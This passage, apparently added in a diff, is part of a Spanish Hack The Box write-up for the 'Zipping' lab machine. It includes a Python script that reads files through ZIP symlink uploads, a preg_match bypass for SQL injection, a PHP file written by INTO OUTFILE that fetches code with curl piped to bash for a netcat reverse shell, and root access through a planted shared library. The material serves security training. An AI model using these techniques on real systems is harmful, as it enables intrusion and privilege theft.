+<span id="cb11-37"><a href="#cb11-37" aria-hidden="true"></a>        soup <span class="op">=</span> BeautifulSoup(r.text, <span class="st">&#39;html.parser&#39;</span>)  </span>
+<span id="cb11-38"><a href="#cb11-38" aria-hidden="true"></a></span>
+<span id="cb11-39"><a href="#cb11-39" aria-hidden="true"></a>        enlaces <span class="op">=</span> soup.find_all(<span class="st">&#39;a&#39;</span>)  </span>
+<span id="cb11-40"><a href="#cb11-40" aria-hidden="true"></a>        uuid <span class="op">=</span> <span class="st">&quot;&quot;</span>  </span>
+<span id="cb11-41"><a href="#cb11-41" aria-hidden="true"></a>  </span>
+<span id="cb11-42"><a href="#cb11-42" aria-hidden="true"></a>        <span class="cf">for</span> enlace <span class="kw">in</span> enlaces:  </span>
+<span id="cb11-43"><a href="#cb11-43" aria-hidden="true"></a>            uuid <span class="op">=</span> enlace[<span class="st">&#39;href&#39;</span>].split(<span class="st">&quot;/&quot;</span>)  </span>
+<span id="cb11-44"><a href="#cb11-44" aria-hidden="true"></a>            <span class="cf">if</span> <span class="st">&quot;uploads&quot;</span> <span class="kw">in</span> uuid:  </span>
+<span id="cb11-45"><a href="#cb11-45" aria-hidden="true"></a>                uuid <span class="op">=</span> enlace[<span class="st">&#39;href&#39;</span>].split(<span class="st">&quot;/&quot;</span>)[<span class="dv">1</span>]  </span>
+<span id="cb11-46"><a href="#cb11-46" aria-hidden="true"></a>                <span class="cf">break</span>  </span>
+<span id="cb11-47"><a href="#cb11-47" aria-hidden="true"></a>  </span>
+<span id="cb11-48"><a href="#cb11-48" aria-hidden="true"></a>        r <span class="op">=</span> requests.get(<span class="ss">f&#39;</span><span class="sc">{</span>url<span class="sc">}</span><span class="ss">/uploads/</span><span class="sc">{</span>uuid<span class="sc">}</span><span class="ss">/shell.pdf&#39;</span>)  </span>
+<span id="cb11-49"><a href="#cb11-49" aria-hidden="true"></a>  </span>
+<span id="cb11-50"><a href="#cb11-50" aria-hidden="true"></a>        <span class="bu">print</span>(r.text)  </span>
+<span id="cb11-51"><a href="#cb11-51" aria-hidden="true"></a>  </span>
+<span id="cb11-52"><a href="#cb11-52" aria-hidden="true"></a><span class="cf">if</span> <span class="va">__name__</span> <span class="op">==</span> <span class="st">&#39;__main__&#39;</span>:</span>
+<span id="cb11-53"><a href="#cb11-53" aria-hidden="true"></a>    arg <span class="op">=</span> arguments()  </span>
+<span id="cb11-54"><a href="#cb11-54" aria-hidden="true"></a>  </span>
+<span id="cb11-55"><a href="#cb11-55" aria-hidden="true"></a>    makeRequest(arg.<span class="bu">file</span>)  </span>
+<span id="cb11-56"><a href="#cb11-56" aria-hidden="true"></a></span>
+<span id="cb11-57"><a href="#cb11-57" aria-hidden="true"></a>    os.remove(<span class="st">&quot;shell.zip&quot;</span>)</span></code></pre></div>
+<p>Lo primero que hace el script es pillar el valor del parámetro.</p>
+<div class="sourceCode" id="cb12"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb12-1"><a href="#cb12-1" aria-hidden="true"></a> <span class="kw">def</span> arguments():</span>
+<span id="cb12-2"><a href="#cb12-2" aria-hidden="true"></a>     parser <span class="op">=</span> argparse.ArgumentParser(description<span class="op">=</span><span class="st">&#39;Local File Inclusion (LFI)&#39;</span>)</span>
+<span id="cb12-3"><a href="#cb12-3" aria-hidden="true"></a>     parser.add_argument(<span class="st">&#39;-f&#39;</span>,<span class="st">&#39;--file&#39;</span>, dest<span class="op">=</span><span class="st">&#39;file&#39;</span>, required<span class="op">=</span><span class="va">True</span>, <span class="bu">type</span><span class="op">=</span><span class="bu">str</span>, <span class="bu">help</span><span class="op">=</span><span class="st">&#39;file you want to show&#39;</span>)</span>
+<span id="cb12-4"><a href="#cb12-4" aria-hidden="true"></a>     <span class="cf">return</span> parser.parse_args()</span>
+<span id="cb12-5"><a href="#cb12-5" aria-hidden="true"></a></span>
+<span id="cb12-6"><a href="#cb12-6" aria-hidden="true"></a>arg <span class="op">=</span> arguments()</span></code></pre></div>
+<p>Con el valor ya obtenido, lo envía a la función <strong>makeRequest</strong> .</p>
+<div class="sourceCode" id="cb13"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb13-1"><a href="#cb13-1" aria-hidden="true"></a>makeRequest(arg.<span class="bu">file</span>)</span></code></pre></div>
+<p>Lo primero que hace la función es eliminar en caso de que existan, el archivo PDF y el ZIP.</p>
+<div class="sourceCode" id="cb14"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb14-1"><a href="#cb14-1" aria-hidden="true"></a>url <span class="op">=</span> <span class="st">&quot;http://10.10.11.229&quot;</span>  </span>
+<span id="cb14-2"><a href="#cb14-2" aria-hidden="true"></a>  </span>
+<span id="cb14-3"><a href="#cb14-3" aria-hidden="true"></a>    <span class="cf">if</span> os.path.exists(<span class="st">&quot;shell.pdf&quot;</span>):  </span>
+<span id="cb14-4"><a href="#cb14-4" aria-hidden="true"></a>        os.remove(<span class="st">&quot;shell.pdf&quot;</span>)  </span>
+<span id="cb14-5"><a href="#cb14-5" aria-hidden="true"></a>  </span>
+<span id="cb14-6"><a href="#cb14-6" aria-hidden="true"></a>    <span class="cf">if</span> os.path.exists(<span class="st">&quot;passwd.zip&quot;</span>):  </span>
+<span id="cb14-7"><a href="#cb14-7" aria-hidden="true"></a>        os.remove(<span class="st">&quot;shell.zip&quot;</span>)</span></code></pre></div>
+<p>Después de eliminar los archivos, crea primero el archivo PDF con el enlace simbólico que es recibido por el parámetro, para luego crear el archivo ZIP enviando el stdout (1) al “/dev/null” para que no se muestre el output del comando zip.</p>
+<div class="sourceCode" id="cb15"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb15-1"><a href="#cb15-1" aria-hidden="true"></a> <span class="bu">print</span>(<span class="st">&quot;Creando enlace simbolico...&quot;</span>)</span>
+<span id="cb15-2"><a href="#cb15-2" aria-hidden="true"></a> time.sleep(<span class="dv">1</span>)</span>
+<span id="cb15-3"><a href="#cb15-3" aria-hidden="true"></a> os.system(<span class="ss">f&quot;ln -s </span><span class="sc">{</span><span class="bu">file</span><span class="sc">}</span><span class="ss"> shell.pdf&quot;</span>)</span>
+<span id="cb15-4"><a href="#cb15-4" aria-hidden="true"></a></span>
+<span id="cb15-5"><a href="#cb15-5" aria-hidden="true"></a> <span class="bu">print</span>(<span class="st">&quot;Creando fichero ZIP...&quot;</span>)</span>
+<span id="cb15-6"><a href="#cb15-6" aria-hidden="true"></a> time.sleep(<span class="dv">1</span>)</span>
+<span id="cb15-7"><a href="#cb15-7" aria-hidden="true"></a> os.system(<span class="st">&quot;zip --symlinks shell.zip shell.pdf 1&gt;/dev/null&quot;</span>)</span></code></pre></div>
+<p>Luego abre el archivo zip en modo binario para luego crear un diccionario con el nombre del archivo y su contenido.</p>
+<div class="sourceCode" id="cb16"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb16-1"><a href="#cb16-1" aria-hidden="true"></a>    <span class="cf">with</span> <span class="bu">open</span>(<span class="st">&quot;passwd.zip&quot;</span>, <span class="st">&quot;rb&quot;</span>) <span class="im">as</span> archivo:  </span>
+<span id="cb16-2"><a href="#cb16-2" aria-hidden="true"></a>        file_zip <span class="op">=</span> {<span class="st">&quot;zipFile&quot;</span>: (<span class="st">&quot;passwd.zip&quot;</span>, archivo, <span class="st">&quot;application/zip&quot;</span>), <span class="st">&#39;submit&#39;</span>: (<span class="va">None</span>, <span class="st">&#39;&#39;</span>)}  </span>
+<span id="cb16-3"><a href="#cb16-3" aria-hidden="true"></a>  </span>
+<span id="cb16-4"><a href="#cb16-4" aria-hidden="true"></a>        headers <span class="op">=</span> {<span class="st">&quot;Host&quot;</span>: <span class="st">&quot;10.10.11.229&quot;</span>, <span class="st">&quot;User-Agent&quot;</span>: <span class="st">&quot;Mozilla/5.0 (X11;Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&quot;</span>}  </span>
+<span id="cb16-5"><a href="#cb16-5" aria-hidden="true"></a>  </span>
+<span id="cb16-6"><a href="#cb16-6" aria-hidden="true"></a>        s <span class="op">=</span> requests.Session()  </span></code></pre></div>
+<p>Y en la misma sesión envía el archivo ZIP.</p>
+<div class="sourceCode" id="cb17"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb17-1"><a href="#cb17-1" aria-hidden="true"></a>        r <span class="op">=</span> s.post(<span class="ss">f&quot;</span><span class="sc">{</span>url<span class="sc">}</span><span class="ss">/upload.php&quot;</span>, files<span class="op">=</span>file_zip)  </span></code></pre></div>
+<p>Para terminar, con la librería “BeautifulSoup” extrae el contenido HTML, el cual consigue el nombre del UUID, para luego realizar una ultima solicitud vía GET e imprimir el contenido.</p>
+<div class="sourceCode" id="cb18"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb18-1"><a href="#cb18-1" aria-hidden="true"></a>        soup <span class="op">=</span> BeautifulSoup(r.text, <span class="st">&#39;html.parser&#39;</span>)  </span>
+<span id="cb18-2"><a href="#cb18-2" aria-hidden="true"></a>  </span>
+<span id="cb18-3"><a href="#cb18-3" aria-hidden="true"></a>        enlaces <span class="op">=</span> soup.find_all(<span class="st">&#39;a&#39;</span>)  </span>
+<span id="cb18-4"><a href="#cb18-4" aria-hidden="true"></a>        uuid <span class="op">=</span> <span class="st">&quot;&quot;</span>  </span>
+<span id="cb18-5"><a href="#cb18-5" aria-hidden="true"></a>  </span>
+<span id="cb18-6"><a href="#cb18-6" aria-hidden="true"></a>        <span class="cf">for</span> enlace <span class="kw">in</span> enlaces:  </span>
+<span id="cb18-7"><a href="#cb18-7" aria-hidden="true"></a>            uuid <span class="op">=</span> enlace[<span class="st">&#39;href&#39;</span>].split(<span class="st">&quot;/&quot;</span>)  </span>
+<span id="cb18-8"><a href="#cb18-8" aria-hidden="true"></a>            <span class="cf">if</span> <span class="st">&quot;uploads&quot;</span> <span class="kw">in</span> uuid:  </span>
+<span id="cb18-9"><a href="#cb18-9" aria-hidden="true"></a>                uuid <span class="op">=</span> enlace[<span class="st">&#39;href&#39;</span>].split(<span class="st">&quot;/&quot;</span>)[<span class="dv">1</span>]  </span>
+<span id="cb18-10"><a href="#cb18-10" aria-hidden="true"></a>                <span class="cf">break</span>  </span>
+<span id="cb18-11"><a href="#cb18-11" aria-hidden="true"></a>  </span>
+<span id="cb18-12"><a href="#cb18-12" aria-hidden="true"></a>        r <span class="op">=</span> requests.get(<span class="ss">f&#39;</span><span class="sc">{</span>url<span class="sc">}</span><span class="ss">/uploads/</span><span class="sc">{</span>uuid<span class="sc">}</span><span class="ss">/shell.pdf&#39;</span>)  </span>
+<span id="cb18-13"><a href="#cb18-13" aria-hidden="true"></a>  </span>
+<span id="cb18-14"><a href="#cb18-14" aria-hidden="true"></a>        <span class="bu">print</span>(r.text)</span></code></pre></div>
+<p>Al ejecutar el script podemos ver los archivos del sistema.</p>
+<img src="Img/Pasted image 20240427174717.png">
+<p>Suponiendo que la pagina se encuentra en la ruta <strong>/var/www/html</strong> tratamos de ver ahora el contenido del <strong>product.php</strong> .</p>
+<img src="Img/Pasted image 20240427175045.png">
+<p>Vemos que hay un texto que pone que la consulta es inyectable.</p>
+<img src="Img/Pasted image 20240427180344.png">
+<p>Hay un parámetro <strong>ID</strong>, el cual seguramente sea el de los productos.</p>
+<img src="Img/Pasted image 20240427184716.png">
+<h2>Explotación</h2>
+<p>Pero para llegar a esa consulta primero debemos ver una formar de poder bypassear el <strong>preg_match</strong>, ya que vemos que nos restringe las formas para poder realizar una inyección SQL enviándonos al <strong>index.php</strong> .</p>
+<img src="Img/Pasted image 20240427184846.png">
+<p>Buscando por internet vemos que una forma de bypassear el <strong>preg_match</strong> es realizando un salto de línea.</p>
+<img src="Img/Pasted image 20240428093326.png">
+<img src="Img/Pasted image 20240428095326.png">
+<p>Para cerrar la query y poner otra utilizaremos el punto y coma <strong>;</strong> .</p>
+<img src="Img/Pasted image 20240428105854.png">
+<p>Pero vemos que no nos funciona.</p>
+<img src="Img/Pasted image 20240428105937.png">
+<p>Eso es por que al final tiene que haber un numero.</p>
+<img src="Img/Pasted image 20240428110220.png">
+<img src="Img/Pasted image 20240428110242.png">
+<p>Al ponerlo ya si que nos realiza los 5 segundos de espera.</p>
+<img src="Img/Pasted image 20240428110325.png">
+<p>Viendo otros archivos del sistema vemos que en el <strong>/shop/index.php</strong> esta accediendo a recursos del sistema mediante el parámetro <strong>page</strong> pero además esta añadiendo a la fuerza la extensión <strong>.php</strong> .</p>
+<img src="Img/Pasted image 20240428110448.png">
+<p>Con <strong>into outfile</strong> podemos crear archivos con contenido en la inyección SQL.</p>
+<p>Para hacer un ejemplo vamos ha crear el archivo <strong>test.txt</strong> en la ruta <strong>/tmp</strong> .</p>
+<img src="Img/Pasted image 20240428113709.png">
+<p>Pero vemos que no tenemos acceso.</p>
+<img src="Img/Pasted image 20240428113737.png">
+<p>Las consultas que se realizan, seguramente sean del usuario mysql, por tanto una de las rutas que utiliza mysql es <strong>/var/lib/mysql</strong> .</p>
+<p>Tratando de añadir un archivo a esa ruta vemos que nos funciona.</p>
+<img src="Img/Pasted image 20240428114551.png">
+<img src="Img/Pasted image 20240428114606.png">
+<p>Ahora teniendo la capacidad de poder crear archivos con <strong>into outfile</strong> y acceder a ellos con el parámetro <strong>?page</strong> vamos a tratar de crear un archivo <strong>.php</strong> el cual nos envié una ReverseShell.</p>
+<p>En este caso vamos a crear un archivo PHP el cual realizara una petición a un servicio http que nosotros crearemos hacia un archivo que realizara el envío de la shell.</p>
+<p>Creamos el archivo.</p>
+<img src="Img/Pasted image 20240428121119.png">
+<p>Creamos el servicio HTTP con Python.</p>
+<img src="Img/Pasted image 20240428121152.png">
+<p>Para la creación del archivo PHP, para que no de problemas el tema del URL vamos a urlencodearlo todo, y en la parte de la petición con curl, para que luego nos ejecute el output, vamos a utilizar el pipe <strong>|</strong> seguido del comando <strong>bash</strong> para que sea ejecutado.</p>
+<img src="Img/Pasted image 20240428123301.png">
+<img src="Img/Pasted image 20240428123333.png">
+<p>Con el archivo ya creado nos ponemos en escucha por el puerto <strong>443</strong> con <strong>netcat</strong> .</p>
+<div class="sourceCode" id="cb19"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb19-1"><a href="#cb19-1" aria-hidden="true"></a>❯ <span class="ex">nc</span> -lvnp 443</span>
+<span id="cb19-2"><a href="#cb19-2" aria-hidden="true"></a><span class="ex">listening</span> on [any] 443 ...</span></code></pre></div>
+<table>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-l</td>
+<td>Inicia el netcat en modo escucha</td>
+</tr>
+<tr class="even">
+<td>-v</td>
+<td>Muestra información durante la ejecución</td>
+</tr>
+<tr class="odd">
+<td>-n</td>
+<td>No se realiza resolución DNS</td>
+</tr>
+<tr class="even">
+<td>-p</td>
+<td>Especifica el número de puerto de escucha</td>
+</tr>
+</tbody>
+</table>
+<p>Al accede al archivo <strong>rev.php</strong>, recibimos una petición por GET en el servicio HTTP.</p>
+<img src="Img/Pasted image 20240428123646.png">
+<img src="Img/Pasted image 20240428123628.png">
+<p>Y al ver el netcat vemos que recibimos la ReverseShell.</p>
+<img src="Img/Pasted image 20240428123859.png">
+<p>Teniendo ya acceso a la maquina podemos ver la primera flag.</p>
+<div class="sourceCode" id="cb20"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb20-1"><a href="#cb20-1" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/var/www/html/shop$ cat /home/rektsu/user.txt </span>
+<span id="cb20-2"><a href="#cb20-2" aria-hidden="true"></a><span class="ex">7dc***************************</span></span>
+<span id="cb20-3"><a href="#cb20-3" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/var/www/html/shop$ </span></code></pre></div>
+<h2>Post-explotación</h2>
+<p>Mirando los permisos que tenemos vemos que podemos ejecutar el binario <strong>stock</strong> como cualquier usuario y sin proporcionar la contraseña.</p>
+<div class="sourceCode" id="cb21"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb21-1"><a href="#cb21-1" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/var/www/html/shop$ sudo -l</span>
+<span id="cb21-2"><a href="#cb21-2" aria-hidden="true"></a><span class="fu">sudo</span> -l</span>
+<span id="cb21-3"><a href="#cb21-3" aria-hidden="true"></a><span class="ex">Matching</span> Defaults entries for rektsu on zipping:</span>
+<span id="cb21-4"><a href="#cb21-4" aria-hidden="true"></a>    <span class="ex">env_reset</span>, mail_badpass,</span>
+<span id="cb21-5"><a href="#cb21-5" aria-hidden="true"></a>    <span class="va">secure_path=</span>/usr/local/sbin\:<span class="ex">/usr/local</span>/<span class="ex">bin</span>\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span>
+<span id="cb21-6"><a href="#cb21-6" aria-hidden="true"></a></span>
+<span id="cb21-7"><a href="#cb21-7" aria-hidden="true"></a><span class="ex">User</span> rektsu may run the following commands on zipping:</span>
+<span id="cb21-8"><a href="#cb21-8" aria-hidden="true"></a>    <span class="kw">(</span><span class="ex">ALL</span><span class="kw">)</span> <span class="ex">NOPASSWD</span>: /usr/bin/stock</span></code></pre></div>
+<p>Al ejecutar el binario vemos que nos pide una contraseña.</p>
+<img src="Img/Pasted image 20240428142157.png">
+<p>Con <strong>strings</strong> si miramos las cadenas imprimibles del binario vemos una contraseña.</p>
+<img src="Img/Pasted image 20240428142332.png">
+<img src="Img/Pasted image 20240428142400.png">
+<p>Al poner la contraseña nos muestra un menu.</p>
+<img src="Img/Pasted image 20240428142420.png">
+<p>Con el comando <strong>strace</strong> vamos a ver que es lo que hace a bajo nivel.</p>
+<img src="Img/Pasted image 20240428142707.png">
+<p>Al poner la contraseña vemos que esta tratando de ejecutar la librería <strong>libcounter.so</strong> que se encuentra en mi ruta personal de trabajo.</p>
+<img src="Img/Pasted image 20240428142757.png">
+<p>Pero dentro no se encuentra esa librería.</p>
+<div class="sourceCode" id="cb22"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb22-1"><a href="#cb22-1" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/home/rektsu$ ls -la .config </span>
+<span id="cb22-2"><a href="#cb22-2" aria-hidden="true"></a><span class="ex">total</span> 8</span>
+<span id="cb22-3"><a href="#cb22-3" aria-hidden="true"></a><span class="ex">drwxrwxr-x</span> 2 rektsu rektsu 4096 May  4  2023 .</span>
+<span id="cb22-4"><a href="#cb22-4" aria-hidden="true"></a><span class="ex">drwxr-x--x</span> 7 rektsu rektsu 4096 Aug  7  2023 ..</span>
+<span id="cb22-5"><a href="#cb22-5" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/home/rektsu$ </span></code></pre></div>
+<p>Por lo que vamos ha crear ese archivo de biblioteca compartida para que el binario al ejecutar ese archivo nos ejecute el comando que nosotros le indiquemos.</p>
+<p>Creamos el archivo.</p>
+<img src="Img/Pasted image 20240428144607.png">
+<p>Lo compilamos.</p>
+<div class="sourceCode" id="cb23"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb23-1"><a href="#cb23-1" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/home/rektsu$ gcc -shared -fPIC -o libcounter.so libcounter.c </span></code></pre></div>
+<table>
+<colgroup>
+<col style="width: 9%" />
+<col style="width: 90%" />
+</colgroup>
+<thead>
+<tr class="header">
+<th>Parámetros</th>
+<th>Descripción</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td>-shared</td>
+<td>Se utiliza para generar un archivo compartido en lugar de un archivo ejecutable estándar.</td>
+</tr>
+<tr class="even">
+<td>-fPIC</td>
+<td>Genera código independiente de posición, lo que es esencial para las bibliotecas compartidas.</td>
+</tr>
+<tr class="odd">
+<td>-o</td>
+<td>Especifica el nombre del archivo de salida generado por el compilador.</td>
+</tr>
+</tbody>
+</table>
+<p>Y lo metemos al directorio <strong>.config</strong> .</p>
+<div class="sourceCode" id="cb24"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb24-1"><a href="#cb24-1" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/home/rektsu$ mv libcounter.so .config/</span>
+<span id="cb24-2"><a href="#cb24-2" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/home/rektsu$ ls .config/</span>
+<span id="cb24-3"><a href="#cb24-3" aria-hidden="true"></a><span class="ex">libcounter.so</span></span>
+<span id="cb24-4"><a href="#cb24-4" aria-hidden="true"></a><span class="ex">rektsu@zipping</span>:/home/rektsu$ </span></code></pre></div>
+<p>Al ejecutar el binario de nuevo y meter la contraseña, ya recibimos la shell como el usuario <strong>root</strong> .</p>
+<img src="Img/Pasted image 20240428145109.png">
+<p>Y ya finalmente podemos visualizar la ultima flag.</p>
+<div class="sourceCode" id="cb25"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb25-1"><a href="#cb25-1" aria-hidden="true"></a><span class="ex">root@zipping</span>:/home/rektsu# cd /root</span>
+<span id="cb25-2"><a href="#cb25-2" aria-hidden="true"></a><span class="ex">root@zipping</span>:~# cat root.txt </span>
+<span id="cb25-3"><a href="#cb25-3" aria-hidden="true"></a><span class="ex">32e***************************</span></span>
+<span id="cb25-4"><a href="#cb25-4" aria-hidden="true"></a><span class="ex">root@zipping</span>:~# </span></code></pre></div>
+
+<p>Aqui se explica con detalle el <a class="link" href="https://github.com/MrPr1ngl3s/AutoPWN/tree/main/HTB/Zipping" target="_blank">AutoPWN</a> de la máquina Zipping.</p>
+
+<hr />
+<p>© <script>document.write(new Date().getFullYear());</script> - Mr. Pr1ngl3s</p>
+
+
+  </div>
+</body>
+</html>
